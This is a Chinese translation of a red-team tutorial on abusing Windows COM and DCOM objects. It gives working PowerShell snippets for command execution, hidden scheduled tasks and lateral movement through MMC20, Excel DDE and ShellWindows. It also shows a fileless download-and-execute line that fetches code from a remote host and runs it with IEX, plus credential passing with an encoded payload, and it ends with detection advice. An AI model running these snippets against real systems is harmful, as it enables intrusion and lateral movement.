> 原文链接: https://www.anquanke.com//post/id/215960 


# 攻防技术：如何滥用COM &amp; DCOM对象


                                阅读量   
                                **212588**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者packetstormsecurity，文章来源：dl.packetstormsecurity.net
                                <br>原文地址：[https://dl.packetstormsecurity.net/papers/general/abusing-objects.pdf](https://dl.packetstormsecurity.net/papers/general/abusing-objects.pdf)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a35deb1d61d09751.jpg)](https://p1.ssl.qhimg.com/t01a35deb1d61d09751.jpg)



## 一、概述

如今，蓝队成员大多熟悉流行的横向移动技术，这使得红队的攻击过程变得更加困难。所以，能否运用新型的初始访问和横向移动技术，成为了红队能否成功实现攻击的关键。在本文中，我们将介绍如何滥用DCOM对象，以及如何利用特定的COM对象来实现任务调度、无文件下载/执行、命令执行、在网络内部的横向移动。需要注意的是，这些对象的使用过程可能会被基于进程行为、基于启发式签名的检测方法检测到，从而导致失败。



## 二、关于COM对象

COM对象即“组件对象模型”，是一个独立于平台、分布式、面向对象的系统，用于创建可以交互的二进制软件组件。COM是Microsoft的OLE（复合文档）、ActiveX（启用网络的组件）和其他组件的基础技术。



## 三、COM与DCOM对象的区别

参考我们前面定义过的COM对象，DCOM与COM的主要区别是在于，COM是在客户端计算机的本地级别执行的，而DCOM（分布式组件对象模型）是在服务器端运行，我们可以将指令传递给DCOM对象，并使其通过网络执行。有一种更加简单的描述方法，我们可以将DCOM理解为通过RPC实现的COM。



## 四、为什么选择COM对象

使用COM对象的优势在于，从父子进程关系来看，它看上去是合法的，因为远程执行的任何内容（例如cmd.exe、powershell.exe等）都会作为子进程，而这种场景非常常见，比如explorer.exe的子进程。



## 五、DCOM的工作原理

在Windows注册表中，有3个标识符中包含DCOM配置数据：

1、CLSID：类标识符（CLSID）是全局唯一标识符（GUID）。Windows将每个已安装类的CLSID存储在程序中。当我们需要运行一个类时，我们需要正确的CLSID，这样Windows才能知道去哪里可以找到对应的程序。

2、PROGID：程序标识符（PROGID）是一个可选标识符，开发人员可以用它来代替更复杂、更严格的CLSID。PROGID通常更易于阅读和理解。但是，对于具有相同名称的PROGID并没有进行限制，这有可能会产生问题。

3、APPID：应用程序标识符（APPID）标识属于同一个可执行文件的所有类以及访问该可执行文件所需的权限。如果APPID不正确，DCOM将无法正常工作。

为了使DCOM可以访问COM对象，必须将AppID与该类的CLSID关联，并且需要为AppID提供适当的权限。没有关联AppID的COM对象不能从远程计算机直接访问。

基本的DCOM事务如下所示：

1、客户端计算机通过其CLSID或PROGID请求远程计算机创建对象。如果客户端传递了APPID，则远程计算机会使用PROGID查找CLSID。

2、远程计算机检查APPID，并验证客户端是否具有创建对象的权限。

3、DCOMLaunch.exe（如果是EXE）或DLLHOST.exe（如果是DLL）创建客户端计算机请求的类的实例。

4、通讯成功。

5、客户端现在可以访问远程计算机上的类中的所有函数。



## 六、利用COM对象实现命令执行

### <a class="reference-link" name="6.1%20CLSID%20%7BE430E93D-09A9-4DC5-80E3-CBB2FB9AF28E%7D%E7%9A%84COM%E5%AF%B9%E8%B1%A1"></a>6.1 CLSID `{`E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E`}`的COM对象

Fireeye的研究人员Charles Hamilton发现prchauto.dll（位于C:\Program Files (x86)\Windows Kits\10\App Certification Kit\prchauto.dll）具有一个名为`ProcessChain`的类，该类公开了`CommandLine`属性，以及一个`Start`方法。

CLSID `{`E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E`}`：

[![](https://p3.ssl.qhimg.com/t017c1e810457978af5.png)](https://p3.ssl.qhimg.com/t017c1e810457978af5.png)

`Start`接受对布尔值的引用。可以使用如下方式启动命令：

```
$handle = [activator]::CreateInstance([type]::GetTypeFromCLSID("E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E"))
$handle.CommandLine = "cmd /c whoami"
$handle.Start([ref]$True)
```

执行`{`E430E93D-09A9-4DC5-80E3-CBB2FB9AF28E`}`：

[![](https://p2.ssl.qhimg.com/t012dc37986a9adf8a9.png)](https://p2.ssl.qhimg.com/t012dc37986a9adf8a9.png)

### <a class="reference-link" name="6.2%20CLSID%20%7BF5078F35-C551-11D3-89B9-0000F81FE221%7D%EF%BC%88Msxml2.XMLHTTP.3.0%EF%BC%89%E7%9A%84COM%E5%AF%B9%E8%B1%A1"></a>6.2 CLSID `{`F5078F35-C551-11D3-89B9-0000F81FE221`}`（Msxml2.XMLHTTP.3.0）的COM对象

该对象公开了XML HTTP 3.0功能，可以用于下载并执行任意代码，而无需将Payload写入磁盘中，也不会触发寻找常用System.Net.WebClient的规则。XML HTTP 3.0对象通常用于执行AJAX请求。在这种情况下，可以使用`Invoke-Expression cmdlet`（IEX）直接执行提取的数据，这可以导致无文件下载和执行。

CLSID `{`F5078F35-C551-11D3-89B9-0000F81FE221`}`：

[![](https://p3.ssl.qhimg.com/t017e698768639375fc.png)](https://p3.ssl.qhimg.com/t017e698768639375fc.png)

```
$o = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221")); $o.Open("GET", "http://10.10.10.10/code.ps1", $False); $o.Send(); IEX $o.responseText;
```

### <a class="reference-link" name="6.3%20CLSID%20%7B0F87369F-A4E5-4CFC-BD3E-73E6154572DD%7D%E7%9A%84COM%E5%AF%B9%E8%B1%A1"></a>6.3 CLSID `{`0F87369F-A4E5-4CFC-BD3E-73E6154572DD`}`的COM对象

该COM对象实现了用于操作Windows任务计划服务的`Schedule.Service`类。该COM对象允许特权用户在主机（包括远程主机）上调度任务，而无需在命令中使用schtasks.exe二进制文件或schtasks.exe。

```
$TaskName = [Guid]::NewGuid().ToString()
$Instance = [activator]::CreateInstance([type]::GetTypeFromProgID("Schedule.Service"))
$Instance.Connect()
$Folder = $Instance.GetFolder("\")
$Task = $Instance.NewTask(0)
$Trigger = $Task.triggers.Create(0)
$Trigger.StartBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay))
$Trigger.EndBoundary = Convert-Date -Date ((Get-Date).addSeconds($Delay + 120))
$Trigger.ExecutionTimelimit = "PT5M"
$Trigger.Enabled = $True
$Trigger.Id = $Taskname
$Action = $Task.Actions.Create(0)
$Action.Path = “cmd.exe”
$Action.Arguments = “/c whoami”
$Action.HideAppWindow = $True
$Folder.RegisterTaskDefinition($TaskName, $Task, 6, "", "", 3)
function Convert-Date `{` 
    param(
        [datetime]$Date
    )
    PROCESS `{`
        $Date.Touniversaltime().tostring("u") -replace " ","T"
    `}`
`}`
```

### <a class="reference-link" name="6.4%20CLSID%20%7B9BA05972-F6A8-11CF-A442-00A0C90A8F39%7D%E7%9A%84COM%EF%BC%88ShellWindows%EF%BC%89"></a>6.4 CLSID `{`9BA05972-F6A8-11CF-A442-00A0C90A8F39`}`的COM（ShellWindows）

这种方法由现有的explorer.exe进程托管，ShellWindow COM对象使用`Document.Application`属性。通过递归COM对象方法可以发现，我们可以对`Document.Application.Parent`属性返回的对象调用`ShellExecute`方法。

CLSID `{`9BA05972-F6A8-11CF-A442-00A0C90A8F39`}`：

[![](https://p0.ssl.qhimg.com/t01872df7635197a299.png)](https://p0.ssl.qhimg.com/t01872df7635197a299.png)

```
$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
$item = $hb.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```

### <a class="reference-link" name="6.5%20CLSID%20%7BC08AFD90-F2A1-11D1-8455-00A0C91F3880%7D%E7%9A%84COM%E5%AF%B9%E8%B1%A1%EF%BC%88ShellBrowserWindow%EF%BC%89"></a>6.5 CLSID `{`C08AFD90-F2A1-11D1-8455-00A0C91F3880`}`的COM对象（ShellBrowserWindow）

与ShellWindows一样，该方法由现有的explorer.exe进程托管，ShellBrowserWindow COM对象使用`Document.Application`属性，并且可以在`Document.Application.Parent`返回的对象上调用`ShellExecute`方法属性。

CLSID `{`C08AFD90-F2A1-11D1-8455-00A0C91F3880`}`：

[![](https://p1.ssl.qhimg.com/t01e256c518a04d6cf1.png)](https://p1.ssl.qhimg.com/t01e256c518a04d6cf1.png)

```
$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880"))
$hb.Document.Application.Parent.ShellExecute("calc.exe")
```



## 七、利用DCOM对象实现横向移动

### <a class="reference-link" name="7.1%20MMC%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%B1%BB%EF%BC%88MMC20.Application%EF%BC%89"></a>7.1 MMC应用程序类（MMC20.Application）

由Matt Nelson在2007年发现，该COM对象允许我们编写`MMCsnap-in`操作的组件脚本，但是Matt发现我们可以利用`Document.ActiveView`下名为`ExecuteShellCommand`的方法通过网络执行命令。

DCOM（MMC20.Application）：

[![](https://p5.ssl.qhimg.com/t0106ea8bf4cf30761d.png)](https://p5.ssl.qhimg.com/t0106ea8bf4cf30761d.png)

我们可以使用`MMC20.Application`的`ExecuteShellCommand`方法来远程执行命令或启动进程。

```
$hb = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.126.134"))     
$hb.Document.ActiveView.ExecuteShellCommand('cmd',$null,'/c echo Haboob &gt; C:\hb.txt','7')
```

执行MMC20.Application：

[![](https://p5.ssl.qhimg.com/t01692d58ccfbeab915.png)](https://p5.ssl.qhimg.com/t01692d58ccfbeab915.png)

### <a class="reference-link" name="7.2%20EXCEL%20DDE%EF%BC%88Excel.Application%EF%BC%89"></a>7.2 EXCEL DDE（Excel.Application）

可以通过Cybereason最先发现的DCOM远程使用Office应用程序中的DDE功能。

`Excel.Application`的`DDEInitiate`方法：

[![](https://p5.ssl.qhimg.com/t018a8d875151d5c9f8.png)](https://p5.ssl.qhimg.com/t018a8d875151d5c9f8.png)

由`Excel.Applicationobjects`公开的`DDEInitiate`方法将`App`参数限制为8个字符，但是将`Topic`的可管理字符限制为1024个，这是由于`CreateProcess`函数导致的。此外，该方法在`App`参数后面附加了`.exe`，因此cmd.exe会尝试运行`cmd.exe.exe`，显然会失败，因此在调用该方法时我们需要删除其扩展名（`.exe`）。同时，它也会弹出一些警报，但研究人员发现可以通过调整`DisplayAlerts`属性来禁用警报。

`Excel.Application`的`DisplayAlerts`方法：

[![](https://p0.ssl.qhimg.com/t01169912941d576703.png)](https://p0.ssl.qhimg.com/t01169912941d576703.png)

```
$hb = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.126.134"))
$hb.DisplayAlerts = $false
$hb.DDEInitiate('cmd','/c echo Haboob &gt; C:\hb.txt')
```

执行`Excel.ApplicationDCOM`：

[![](https://p2.ssl.qhimg.com/t0190b710f3d75db64f.png)](https://p2.ssl.qhimg.com/t0190b710f3d75db64f.png)

### 7.3 iexplorer.exe中的`internetexplorer.Application`

这是由homjxi0e发现的一种技术，我们可以使用`navigate`方法在远程计算机上打开Internet Explorer浏览器，并利用这种方式通过浏览器获取命令执行。

枚举`internetexplorer.Application`：

[![](https://p0.ssl.qhimg.com/t01ba07e1b46ec0d7c9.png)](https://p0.ssl.qhimg.com/t01ba07e1b46ec0d7c9.png)

```
$Object_COM = [Activator]::CreateInstance([type]::GetTypeFromProgID("InternetExplorer.Application","192.168.126.134"))
$Object_COM.Visible = $true
$Object_COM.Navigate("http://192.168.100.1/exploit")
```

### <a class="reference-link" name="7.4%20CLSID%20%7B9BA05972-F6A8-11CF-A442-00A0C90A8F39%7D%E7%9A%84DCOM%EF%BC%88ShellWindows%EF%BC%89"></a>7.4 CLSID `{`9BA05972-F6A8-11CF-A442-00A0C90A8F39`}`的DCOM（ShellWindows）

正如我们在前面的命令执行部分中展示的那样，也可以通过在CLSID之后添加远程IP来使用这个COM对象。

执行ShellWindows：

[![](https://p5.ssl.qhimg.com/t01f746260d170f7bf9.png)](https://p5.ssl.qhimg.com/t01f746260d170f7bf9.png)

```
$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39",”192.168.1.1”))
$item = $hb.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
```

### <a class="reference-link" name="7.5%20CLSID%20%7BC08AFD90-F2A1-11D1-8455-00A0C91F3880%7D%E7%9A%84DCOM%E5%AF%B9%E8%B1%A1%EF%BC%88ShellBrowserWindow%EF%BC%89"></a>7.5 CLSID `{`C08AFD90-F2A1-11D1-8455-00A0C91F3880`}`的DCOM对象（ShellBrowserWindow）

与ShellWindows一样，这个COM对象也可以用于在远程计算机上执行命令。

```
$hb = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880",”192.168.1.1”))
$hb.Document.Application.Parent.ShellExecute("calc.exe")
```



## 八、在非交互Shell传递凭据

DCOM对象在当前用户的会话中运行，如果我们有一个非交互式的Shell，并且想在特权更高的用户下运行它，可能就会出现问题。有一种快速的解决方案是在C#中使用antonioCoco的RunAs实现，我们可以将其与所选的DCOM对象组合在一起，从而在非交互式Shell中传递凭据。请注意，这比调用命令要更好，因为它使用的是WinRM。

首先，我们需要使用Base64对所选择的DCOM对象进行编码。

```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$hb = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.126.134"));$hb.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c echo Haboob &gt; C:\hb.txt","7")'))
```

接下来，我们使用以下命令调用`invoke-RunasCs`函数：

```
Invoke-RunasCs -Domain test -Username administrator -Password P@ssw0rd -Command "powershell -e JABoAGIAIAA9ACAAWwBhAGMAdABpAHYAYQB0AG8AcgBdADoAOgBDAHIAZQBhAHQAZQBJAG4AcwB0AGEAbgBjAGUAKABbAHQAeQBwAGUAXQA6ADoARwBlAHQAVAB5AHAAZQBGAHIAbwBtAFAAcgBvAGcASQBEACgAIgBNAE0AQwAyADAALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAsACIAMQA5ADIALgAxADYAOAAuADEAMgA2AC4AMQAzADQAIgApACkAOwAkAGgAYgAuAEQAbwBjAHUAbQBlAG4AdAAuAEEAYwB0AGkAdgBlAFYAaQBlAHcALgBFAHgAZQBjAHUAdABlAFMAaABlAGwAbABDAG8AbQBtAGEAbgBkACgAIgBjAG0AZAAiACwAJABuAHUAbABsACwAIgAvAGMAIABlAGMAaABvACAASABhAGIAbwBvAGIAIAA+ACAAQwA6AFwAaABiAC4AdAB4AHQAIgAsACIANwAiACkA"
```

传递非交互Shell的凭据：

[![](https://p5.ssl.qhimg.com/t0121c37a7acee4dfca.png)](https://p5.ssl.qhimg.com/t0121c37a7acee4dfca.png)



## 九、检测方法

1、使用这些DCOM方法可能需要对远程计算机的特权访问。因此，可以保护特权域帐户，避免在本地计算机的不同帐户之间使用相同的密码。

2、确保对这些控件进行深度防御，使用基于主机的安全产品对主机进行监测，从而发现并阻止可疑活动。启用基于主机的防火墙可以防止RPC/DCOM交互和实例化。

3、监视文件系统（和注册表），确认是否有新引入的组件和更改。

4、监视环境中PowerShell的可疑使用情况。尽可能地实施约束语言模式（对于特权帐户来说可能难以实现）。<br>
5、在DCOM调用失败后，会根据CLSID在目标计算机上生成ID为10010的系统事件（Error, DistributedCOM）。

系统事件ID 10010：

[![](https://p1.ssl.qhimg.com/t014928c6b6f3ea54cf.png)](https://p1.ssl.qhimg.com/t014928c6b6f3ea54cf.png)



## 十、参考文章

[1] [https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model](https://docs.microsoft.com/en-us/windows/win32/com/the-component-object-model)<br>
[2] [https://www.varonis.com/blog/dcom-distributed-component-object-model/](https://www.varonis.com/blog/dcom-distributed-component-object-model/)<br>
[3] [https://codewhitesec.blogspot.com/2018/07/lethalhta.html](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)<br>
[4] [https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects-part-two.html](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects-part-two.html)<br>
[5] [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)<br>
[6] [https://hackdefense.com/assets/downloads/automating-the-enumeration-of-possible-dcom-vulnerabilities-axel-boesenach-v1.0.pdf](https://hackdefense.com/assets/downloads/automating-the-enumeration-of-possible-dcom-vulnerabilities-axel-boesenach-v1.0.pdf)<br>
[7] [https://homjxi0e.wordpress.com/2018/02/15/lateral-movement-using-internetexplorer-application-object-com/](https://homjxi0e.wordpress.com/2018/02/15/lateral-movement-using-internetexplorer-application-object-com/)<br>
[8] [https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique](https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique)
